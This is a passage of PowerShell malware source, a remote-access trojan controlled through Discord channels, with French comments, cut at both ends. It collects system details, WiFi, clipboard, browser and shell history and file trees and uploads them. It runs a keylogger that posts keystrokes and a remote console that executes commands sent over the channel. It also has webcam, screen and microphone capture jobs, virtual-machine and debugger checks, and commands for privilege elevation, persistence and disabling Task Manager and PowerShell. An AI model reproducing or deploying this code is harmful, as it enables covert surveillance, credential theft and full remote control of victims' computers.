     /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
    /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
            \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
==================================================================================================================================
"

        $infomessage1 = "
=======================================
SYSTEM INFORMATION FOR $env:COMPUTERNAME
=======================================
User Information
---------------------------------------
Current User      : $env:USERNAME
Full Name         : $fullName
Email Address     : $email
Other Users       : $users

OS Information
---------------------------------------
Language          : $systemLanguage
Keyboard Layout   : $keyboardLayoutID
Current OS        : $OSString
Build ID          : $WinVersion
Architechture     : $OSArch
Screen Size       : $screensize
Activation Date   : $activated
Location          : $GPS

Hardware Information
---------------------------------------
Processor         : $processor 
Memory            : $RamInfo
Gpu               : $gpu

System Information
---------------------------------------
$computerSystemInfo

Storage
---------------------------------------
$Hddinfo
$DiskHealth

Current System Metrics
---------------------------------------
$PMcpu
$PMmu
$PMdio
$PMnio

AntiVirus Providers
---------------------------------------
$AVinfo

Network Information
---------------------------------------
Public IP Address : $computerPubIP
Local IP Address  : $localIP

Saved WiFi Networks
---------------------------------------
$outssid

Nearby Wifi Networks
---------------------------------------
$Wifi

Other Network Devices
---------------------------------------
$scanresult

Virtual Machine Test
---------------------------------------
$rescheck
$ManufaturerCheck
$ModelCheck
$BiosCheck
$vmDetect

Debugging Software Check
---------------------------------------
$debugDetect

Running Task Managers
---------------------------------------
$runningTaskManagers

"


        $infomessage2 = "

==================================================================================================================================
History Information
----------------------------------------------------------------------------------------------------------------------------------
Clipboard Contents
---------------------------------------
$clipboard

Browser History
---------------------------------------
$entry

Powershell History
---------------------------------------
$pshistory

==================================================================================================================================
Recent File Changes Information
----------------------------------------------------------------------------------------------------------------------------------
$RecentFiles

==================================================================================================================================
USB Information
----------------------------------------------------------------------------------------------------------------------------------
$usbdevices

==================================================================================================================================
Software Information
----------------------------------------------------------------------------------------------------------------------------------
$software

==================================================================================================================================
Running Services Information
----------------------------------------------------------------------------------------------------------------------------------
$service

==================================================================================================================================
Current Processes Information
----------------------------------------------------------------------------------------------------------------------------------
$process

=================================================================================================================================="
    
        $outpath = "$env:TEMP/systeminfo.txt"
        $infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
        $infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
        $infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append
    
        if ($OSString -like '*11*') {
            EnumNotepad
        }
        else {
            "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
        }
    
    
        $resultLines = $infomessage1 -split "`n"
        $currentBatch = ""
        foreach ($line in $resultLines) {
            $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
    
            if (([System.Text.Encoding]::Unicode.GetByteCount($currentBatch) + $lineSize) -gt 1900) {
                sendMsg -Message "``````$currentBatch`````` "
                Start-Sleep -Seconds 1
                $currentBatch = ""
            }
    
            $currentBatch += $line + "`n" 
        }
    
        if ($currentBatch -ne "") {
            sendMsg -Message "``````$currentBatch`````` "
        }
    
        sendFile -sendfilePath $outpath -ChannelID $LootID
        Sleep 1
        Remove-Item -Path $outpath -force
    }

    
    Function FolderTree {
        sendMsg -Message ":arrows_counterclockwise: ``Getting File Trees..`` :arrows_counterclockwise:"
        tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
        tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
        tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
        $FilePath = "$env:temp/TreesOfKnowledge.zip"
        Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
        sleep 1
        sendFile -sendfilePath $FilePath | Out-Null
        rm -Path $FilePath -Force
        Write-Output "Done."
    }

    sendMsg -Message ":hourglass: ``$env:COMPUTERNAME Getting Loot Files.. Please Wait`` :hourglass:"
    SystemInfo
    BrowserDB
    FolderTree

}

# Scriptblock for PS console in discord
$doPowershell = {
    param([string]$token, [string]$PowershellID)
    Function Get-BotUserId {
        $headers = @{
            'Authorization' = "Bot $token"
        }
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
        $botInfo = $botInfo | ConvertFrom-Json
        return $botInfo.id
    }
    $botId = Get-BotUserId
    Start-Sleep -Seconds 2
    $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
    $w = New-Object System.Net.WebClient
    $w.Headers.Add("Authorization", "Bot $token")
    
    # Vérifier si on a les droits admin
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
    $adminStatus = if ($isAdmin) { " [ADMIN]" } else { " [USER]" }
    
    function senddir {
        $dir = $PWD.Path
        $w.Headers.Add("Content-Type", "application/json")
        $j = @{"content" = "``PS$adminStatus | $dir >``" } | ConvertTo-Json
        try {
            $x = $w.UploadString($url, "POST", $j)
        }
        catch {
            Write-Host "Error sending directory: $($_.Exception.Message)"
        }
    }
    senddir
    $p = $null
    while ($true) {
        try {
            $msg = $w.DownloadString($url)
            $r = ($msg | ConvertFrom-Json)[0]
            if ($r -and $r.author -and $r.author.id -ne $botId) {
                $a = $r.timestamp
                $msgContent = $r.content
                if ($a -ne $p -and $msgContent) {
                    $p = $a
                    try {
                        # Exécuter la commande avec capture complète de la sortie
                        $ErrorActionPreference = 'Continue'
                        $out = Invoke-Expression $msgContent 2>&1 | Out-String
                        
                        # Si pas de sortie, vérifier si la commande a réussi
                        if ([string]::IsNullOrWhiteSpace($out)) {
                            $out = "Command executed successfully (no output)"
                        }
                        
                        # Diviser en lignes et traiter
                        $resultLines = $out -split "`r?`n"
                        $maxMessageSize = 1950  # Limite Discord ~2000, on utilise 1950 pour être sûr
                        $currentBatch = ""
                        $batchNumber = 1
                        $totalBatches = [Math]::Ceiling(($out.Length / $maxMessageSize))
                        
                        foreach ($line in $resultLines) {
                            $lineWithNewline = $line + "`n"
                            $lineSize = [System.Text.Encoding]::UTF8.GetByteCount($lineWithNewline)
                            
                            if (([System.Text.Encoding]::UTF8.GetByteCount($currentBatch) + $lineSize) -gt $maxMessageSize) {
                                # Envoyer le batch actuel
                                if ($currentBatch.Length -gt 0) {
                                    $w.Headers.Add("Content-Type", "application/json")
                                    $batchContent = "``````$currentBatch``````"
                                    if ($totalBatches -gt 1) {
                                        $batchContent = "``````[Part $batchNumber/$totalBatches]`n$currentBatch``````"
                                    }
                                    $j = @{"content" = $batchContent } | ConvertTo-Json
                                    try {
                                        $x = $w.UploadString($url, "POST", $j)
                                        Start-Sleep -Milliseconds 500
                                    }
                                    catch {
                                        Write-Host "Error sending batch: $($_.Exception.Message)"
                                    }
                                    $batchNumber++
                                    $currentBatch = ""
                                }
                            }
                            
                            # Ajouter la ligne au batch actuel
                            $currentBatch += $lineWithNewline
                        }
                        
                        # Envoyer le dernier batch
                        if ($currentBatch.Length -gt 0) {
                            $w.Headers.Add("Content-Type", "application/json")
                            $batchContent = "``````$currentBatch``````"
                            if ($totalBatches -gt 1) {
                                $batchContent = "``````[Part $batchNumber/$totalBatches]`n$currentBatch``````"
                            }
                            $j = @{"content" = $batchContent } | ConvertTo-Json
                            try {
                                $x = $w.UploadString($url, "POST", $j)
                            }
                            catch {
                                Write-Host "Error sending final batch: $($_.Exception.Message)"
                            }
                        }
                        
                        senddir
                    }
                    catch {
                        $errorDetails = $_.Exception | Format-List -Force | Out-String
                        $errorMessage = "Error: $($_.Exception.Message)`n`nDetails:`n$errorDetails"
                        
                        # Diviser les erreurs aussi si nécessaire
                        $maxErrorSize = 1950
                        if ($errorMessage.Length -gt $maxErrorSize) {
                            $errorParts = $errorMessage -split "`n"
                            $currentErrorBatch = ""
                            foreach ($part in $errorParts) {
                                if (([System.Text.Encoding]::UTF8.GetByteCount($currentErrorBatch + "`n" + $part)) -gt $maxErrorSize) {
                                    if ($currentErrorBatch.Length -gt 0) {
                                        $w.Headers.Add("Content-Type", "application/json")
                                        $j = @{"content" = "``````$currentErrorBatch``````" } | ConvertTo-Json
                                        try {
                                            $x = $w.UploadString($url, "POST", $j)
                                            Start-Sleep -Milliseconds 500
                                        }
                                        catch {
                                            Write-Host "Error sending error batch: $($_.Exception.Message)"
                                        }
                                        $currentErrorBatch = ""
                                    }
                                }
                                $currentErrorBatch += $part + "`n"
                            }
                            if ($currentErrorBatch.Length -gt 0) {
                                $w.Headers.Add("Content-Type", "application/json")
                                $j = @{"content" = "``````$currentErrorBatch``````" } | ConvertTo-Json
                                try {
                                    $x = $w.UploadString($url, "POST", $j)
                                }
                                catch {
                                    Write-Host "Error sending final error batch: $($_.Exception.Message)"
                                }
                            }
                        }
                        else {
                            $w.Headers.Add("Content-Type", "application/json")
                            $j = @{"content" = "``````$errorMessage``````" } | ConvertTo-Json
                            try {
                                $x = $w.UploadString($url, "POST", $j)
                            }
                            catch {
                                Write-Host "Error sending error message: $($_.Exception.Message)"
                            }
                        }
                        senddir
                    }
                }
            }
        }
        catch {
            Write-Host "Error in PowerShell loop: $($_.Exception.Message)"
        }
        Start-Sleep -Milliseconds 1000  # Réduire le délai pour une réponse plus rapide
    }
}

# Scriptblock for keycapture to discord
$doKeyjob = {
    param([string]$token, [string]$keyID)
    sleep 5
    $script:token = $token
    function sendMsg {
        param([string]$Message)
        $url = "https://discord.com/api/v10/channels/$keyID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($Message) {
            $jsonBody = @{
                "content"  = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $response = $wc.UploadString($url, "POST", $jsonBody)
            $message = $null
        }
    }
    Function Kservice {   
        sendMsg -Message ":mag_right: ``Keylog Started`` :mag_right:"
        $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
        try {
            $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
        }
        catch {
            # Si le type existe déjà, on l'utilise
            $API = [API.Win32]
        }
        $pressed = [System.Diagnostics.Stopwatch]::StartNew()
        # Change for frequency
        $maxtime = [TimeSpan]::FromSeconds(10)
        $keymem = ""
        While ($true) {
            $down = $false
            try {
                while ($pressed.Elapsed -lt $maxtime) {
                    Start-Sleep -Milliseconds 30
                    for ($capture = 8; $capture -le 254; $capture++) {
                        $keyst = $API::GetAsyncKeyState($capture)
                        if ($keyst -eq -32767) {
                            $down = $true
                            $pressed.Restart()
                            $null = [console]::CapsLock
                            $vtkey = $API::MapVirtualKey($capture, 3)
                            $kbst = New-Object Byte[] 256
                            $null = $API::GetKeyboardState($kbst)
                            $strbuild = New-Object -TypeName System.Text.StringBuilder 256
                             
                            if ($API::ToUnicode($capture, $vtkey, $kbst, $strbuild, $strbuild.Capacity, 0)) {
                                $collected = $strbuild.ToString()
                                if ($capture -eq 27) { $collected = "[ESC]" }
                                if ($capture -eq 8) { $collected = "[BACK]" }
                                if ($capture -eq 13) { $collected = "[ENT]" }
                                if ($capture -eq 32) { $collected = " " }
                                if ($capture -eq 9) { $collected = "[TAB]" }
                                $keymem += $collected 
                            }
                        }
                    }
                }
            }
            catch {
                Write-Host "Error in keylogger: $($_.Exception.Message)"
            }
            finally {
                If ($down -and $keymem -ne "") {
                    $escmsgsys = $keymem -replace '[&<>]', { $args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;') }
                    if ($escmsgsys.Length -gt 0) {
                        sendMsg -Message ":mag_right: ``Keys Captured :`` $escmsgsys"
                    }
                    $down = $false
                    $keymem = ""
                }
            }
            $pressed.Restart()
            Start-Sleep -Milliseconds 10
        }
    }
    Kservice
}

# Scriptblock for microphone input to discord
$audiojob = {
    param ([string]$token, [string]$MicrophoneID, [string]$MicrophoneWebhook)
    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$MicrophoneID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($MicrophoneWebhook) {
                    $hooksend = $wc.UploadFile($MicrophoneWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    $outputFile = "$env:Temp\Audio.mp3"
    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
    function getFriendlyName($id) {
        $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
        return (get-ItemProperty $reg).FriendlyName
    }
    $id1 = [audio]::GetDefault(1)
    $MicName = "$(getFriendlyName $id1)"
    while ($true) {
        .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t 60 -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile
        sendFile -sendfilePath $outputFile | Out-Null
        sleep 1
        rm -Path $outputFile -Force
    }
}

# Scriptblock for desktop screenshots to discord
$screenJob = {
    param ([string]$token, [string]$ScreenshotID, [string]$ScreenshotWebhook)
    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$ScreenshotID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($ScreenshotWebhook) {
                    $hooksend = $wc.UploadFile($ScreenshotWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    while ($true) {
        $mkvPath = "$env:Temp\Screen.jpg"
        .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
        sendFile -sendfilePath $mkvPath | Out-Null
        sleep 5
        rm -Path $mkvPath -Force
        sleep 1
    }
}

# Scriptblock for webcam screenshots to discord
$camJob = {
    param ([string]$token, [string]$WebcamID, [string]$WebcamWebhook)    
    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$WebcamID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($WebcamWebhook) {
                    $hooksend = $wc.UploadFile($WebcamWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    $imagePath = "$env:Temp\Image.jpg"
    $Input = (Get-CimInstance Win32_PnPEntity | ? { $_.PNPClass -eq 'Camera' } | select -First 1).Name
    if (!($input)) { $Input = (Get-CimInstance Win32_PnPEntity | ? { $_.PNPClass -eq 'Image' } | select -First 1).Name }
    while ($true) {
        .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
        sendFile -sendfilePath $imagePath | Out-Null
        sleep 5
        rm -Path $imagePath -Force
        sleep 5
    }
}

# Function to start all jobs upon script execution
function StartAll {
    # Automatic capture jobs disabled - use manual commands instead
    # Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID, $global:WebcamWebhook
    # sleep 1
    # Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID, $global:ScreenshotWebhook
    # sleep 1
    # Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID, $global:MicrophoneWebhook
    # sleep 1
    try {
        Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID -ErrorAction Stop
        sleep 1
    }
    catch {
        Write-Host "Error starting Keys job: $($_.Exception.Message)"
    }
    try {
        Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID -ErrorAction Stop
        sleep 1
    }
    catch {
        Write-Host "Error starting Info job: $($_.Exception.Message)"
    }
    try {
        Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID -ErrorAction Stop
        sleep 1
    }
    catch {
        Write-Host "Error starting PSconsole job: $($_.Exception.Message)"
    }
}

Function ConnectMsg {

    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        $adminperm = "False"
    }
    else {
        $adminperm = "True"
    }

    if ($InfoOnConnect -eq '1') {
        $infocall = ':hourglass: Getting system info - please wait.. :hourglass:'
    }
    else {
        $infocall = 'Type `` Options `` in chat for commands list'
    }

    $script:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts      = $false
        embeds   = @(
            @{
                title         = "$env:COMPUTERNAME | C2 session started!"
                "description" = @"
Session Started  : ``$timestamp``

$infocall
"@
                color         = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload

    if ($InfoOnConnect -eq '1') {
        quickInfo
    }
    else {}
}

# ------------------------  FUNCTION CALLS + SETUP  ---------------------------
# Hide the console
If ($hideconsole -eq 1) { 
    HideWindow
}
Function Get-BotUserId {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
    $botInfo = $botInfo | ConvertFrom-Json
    return $botInfo.id
}
$global:botId = Get-BotUserId
# Create category and new channels
NewChannelCategory
sleep 1
NewChannel -name 'session-control'
$global:SessionID = $ChannelID
$global:ch = $ChannelID
sleep 1
NewChannel -name 'screenshots'
$global:ScreenshotID = $ChannelID
sleep 1
NewChannel -name 'webcam'
$global:WebcamID = $ChannelID
sleep 1
NewChannel -name 'microphone'
$global:MicrophoneID = $ChannelID
sleep 1
NewChannel -name 'keycapture'
$global:keyID = $ChannelID
sleep 1
NewChannel -name 'loot-files'
$global:LootID = $ChannelID
sleep 1
NewChannel -name 'powershell'
$global:PowershellID = $ChannelID
sleep 1
# Download ffmpeg to temp folder
$Path = "$env:Temp\ffmpeg.exe"
If (!(Test-Path $Path)) {  
    GetFfmpeg
}
# Opening info message
ConnectMsg
# Start all functions upon running the script
If ($defaultstart -eq 1) { 
    StartAll
}
else {
    # Démarrer les jobs essentiels même si defaultstart est à 0
    # PowerShell, Loot et Keylogger sont nécessaires pour le fonctionnement de base
    try {
        Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID -ErrorAction Stop
        Start-Sleep -Seconds 1
        sendMsg -Message ":white_check_mark: ``PowerShell console job started`` :white_check_mark:"
    }
    catch {
        Write-Host "Error starting PSconsole job: $($_.Exception.Message)"
        sendMsg -Message ":octagonal_sign: ``Failed to start PowerShell console: $($_.Exception.Message)`` :octagonal_sign:"
    }
    try {
        Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID -ErrorAction Stop
        Start-Sleep -Seconds 1
        sendMsg -Message ":white_check_mark: ``System info job started`` :white_check_mark:"
    }
    catch {
        Write-Host "Error starting Info job: $($_.Exception.Message)"
        sendMsg -Message ":octagonal_sign: ``Failed to start System info job: $($_.Exception.Message)`` :octagonal_sign:"
    }
    try {
        Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID -ErrorAction Stop
        Start-Sleep -Seconds 1
        sendMsg -Message ":white_check_mark: ``Keylogger job started`` :white_check_mark:"
    }
    catch {
        Write-Host "Error starting Keys job: $($_.Exception.Message)"
        sendMsg -Message ":octagonal_sign: ``Failed to start Keylogger: $($_.Exception.Message)`` :octagonal_sign:"
    }
}
# Send setup complete message to discord
sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :white_check_mark:"

# ---------------------------------------------------------------------------------------------------------------------------------------------------------

Function CloseMsg {
    $script:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts      = $false
        embeds   = @(
            @{
                title         = " $env:COMPUTERNAME | Session Closed "
                "description" = @"
:no_entry: **$env:COMPUTERNAME** Closing session :no_entry:     
"@
                color         = 16711680
                footer        = @{
                    text = "$timestamp"
                }
            }
        )
    }
    sendMsg -Embed $jsonPayload
}

Function VersionCheck {
    # Version check disabled to prevent automatic restarts
    # $versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
    # $VBpath = "C:\Windows\Tasks\service.vbs"
    # if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1") {
    #     Write-Output "Persistance Installed - Checking Version.."
    #     if (!($version -match $versionCheck)) {
    #         Write-Output "Newer version available! Downloading and Restarting"
    #         RemovePersistance
    #         AddPersistance
    #         $tobat = @"
    # Set WshShell = WScript.CreateObject(`"WScript.Shell`")
    # WScript.Sleep 200
    # WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; irm $parent | iex`", 0, True
    # "@
    #         $tobat | Out-File -FilePath $VBpath -Force
    #         sleep 1
    #         & $VBpath
    #         exit
    #     }
    # }
}

# =============================================================== MAIN LOOP =========================================================================

VersionCheck

while ($true) {

    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$SessionID/messages")
    $most_recent_message = ($messages | ConvertFrom-Json)[0]
    if ($most_recent_message.author.id -ne $botId) {
        $latestMessageId = $most_recent_message.timestamp
        $messages = $most_recent_message.content
    }
    if ($latestMessageId -ne $lastMessageId) {
        $lastMessageId = $latestMessageId
        $global:latestMessageContent = $messages
        $camrunning = Get-Job -Name Webcam -ErrorAction SilentlyContinue
        $sceenrunning = Get-Job -Name Screen -ErrorAction SilentlyContinue
        $audiorunning = Get-Job -Name Audio -ErrorAction SilentlyContinue
        $PSrunning = Get-Job -Name PSconsole -ErrorAction SilentlyContinue
        $lootrunning = Get-Job -Name Info -ErrorAction SilentlyContinue
        $keysrunning = Get-Job -Name Keys -ErrorAction SilentlyContinue
        if ($messages -eq 'webcam') {
            sendMsg -Message ":no_entry: ``AUTOMATIC CAPTURE DISABLED - Use 'TakePhoto' command for manual camera capture`` :no_entry:"
        }
        if ($messages -eq 'screenshots') {
            sendMsg -Message ":no_entry: ``AUTOMATIC CAPTURE DISABLED - Use 'TakeScreenshot' command for manual screenshot capture`` :no_entry:"
        }
        if ($messages -eq 'psconsole') {
            if (!($PSrunning)) {
                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
        }
        if ($messages -eq 'microphone') {
            sendMsg -Message ":no_entry: ``AUTOMATIC CAPTURE DISABLED - Use 'RecordAudioClip X' command for manual audio recording (e.g. RecordAudioClip 30)`` :no_entry:"
        }
        if ($messages -eq 'keycapture') {
            if (!($keysrunning)) {
                try {
                    Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID -ErrorAction Stop
                    sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
                }
                catch {
                    sendMsg -Message ":octagonal_sign: ``Failed to start Keylogger: $($_.Exception.Message)`` :octagonal_sign:"
                }
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
        }
        if ($messages -eq 'systeminfo') {
            if (!($lootrunning)) {
                Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Gathering System Info!`` :white_check_mark:"
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
        }
        if ($messages -eq 'pausejobs') {
            Get-Job | Where-Object { $_.Name -in @('Audio', 'Screen', 'Webcam', 'PSconsole', 'Keys', 'Info') } | Stop-Job -ErrorAction SilentlyContinue
            Get-Job | Where-Object { $_.Name -in @('Audio', 'Screen', 'Webcam', 'PSconsole', 'Keys', 'Info') } | Remove-Job -ErrorAction SilentlyContinue
            sendMsg -Message ":no_entry: ``Stopped All Jobs! : $env:COMPUTERNAME`` :no_entry:"   
        }
        if ($messages -eq 'resumejobs') {
            if (!($lootrunning)) {
                Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Gathering System Info!`` :white_check_mark:"
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
            if (!($keysrunning)) {
                Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
            if (!($PSrunning)) {
                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
            }
            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
            sendMsg -Message ":white_check_mark: ``Resumed Available Jobs! (Automatic capture jobs disabled - use manual commands: TakePhoto, TakeScreenshot, RecordAudioClip)`` :white_check_mark:"   
        }
        if ($messages -eq 'close') {
            CloseMsg
            sleep 2
            exit      
        }
        elseif ($messages -match '^RecordAudioClip\s+(\d+)$') {
            $duration = [int]$matches[1]
            RecordAudioClip -Duration $duration
        }
        elseif ($messages -match '^(?i)(IsAdmin|Elevate|RemovePersistance|AddPersistance|TakePhoto|TakeScreenshot|DisableTaskManager|EnableTaskManager|DisableCMD|EnableCMD|DisablePowerShell|EnablePowerShell)$') {
            $cmdName = $matches[1]
            if ($cmdName -eq 'IsAdmin') { IsAdmin }
            elseif ($cmdName -eq 'Elevate') { Elevate }
            elseif ($cmdName -eq 'RemovePersistance') { RemovePersistance }
            elseif ($cmdName -eq 'AddPersistance') { AddPersistance }
            elseif ($cmdName -eq 'TakePhoto') { TakePhoto }
            elseif ($cmdName -eq 'TakeScreenshot') { TakeScreenshot }
            elseif ($cmdName -eq 'DisableTaskManager') { DisableTaskManager }
            elseif ($cmdName -eq 'EnableTaskManager') { EnableTaskManager }
            elseif ($cmdName -eq 'DisableCMD') { DisableCMD }
            elseif ($cmdName -eq 'EnableCMD') { EnableCMD }
            elseif ($cmdName -eq 'DisablePowerShell') { DisablePowerShell }
            elseif ($cmdName -eq 'EnablePowerShell') { EnablePowerShell }
        }
        elseif ($messages -match '^(?i)Upload\s+(.+)$') {
            # Parser la commande Upload avec le chemin
            $uploadPath = $matches[1].Trim()
            # Supprimer les guillemets si présents
            $uploadPath = $uploadPath.Trim('"', "'")
            Upload -Path $uploadPath
        }
        elseif ($messages -match '^(?i)OpenURL\s+(?:-Url\s+)?(.+)$') {
            # Parser la commande OpenURL avec l'URL
            $url = $matches[1].Trim()
            $url = $url.Trim('"', "'")
            OpenURL -Url $url
        }
        elseif ($messages -match '^(?i)BlockURL\s+(?:-Url\s+)?(.+)$') {
            # Parser la commande BlockURL avec l'URL
            $url = $matches[1].Trim()
            $url = $url.Trim('"', "'")
            BlockURL -Url $url
        }
        elseif ($messages -match '^(?i)UnblockURL\s+(?:-Url\s+)?(.+)$') {
            # Parser la commande UnblockURL avec l'URL
            $url = $matches[1].Trim()
            $url = $url.Trim('"', "'")
            UnblockURL -Url $url
        }
        elseif ($messages -match '^(?i)GetMousePosition$') {
            GetMousePosition
        }
        elseif ($messages -match '^(?i)MoveMouse\s+-X\s+(\d+)\s+-Y\s+(\d+)$') {
            $x = [int]$matches[1]
            $y = [int]$matches[2]
            MoveMouse -X $x -Y $y
        }
        elseif ($messages -match '^(?i)MouseClick\s+(?:-Button\s+)?(left|right)$') {
            $button = $matches[1]
            MouseClick -Button $button
        }
        elseif ($messages -match '^(?i)MouseClick\s+-Button\s+(left|right)$') {
            $button = $matches[1]
            MouseClick -Button $button
        }
        elseif ($messages -match '^(?i)TypeText\s+(?:-Text\s+)?["''](.+)["'']$') {
            $text = $matches[1]
            TypeText -Text $text
        }
        elseif ($messages -match '^(?i)TypeText\s+-Text\s+(.+)$') {
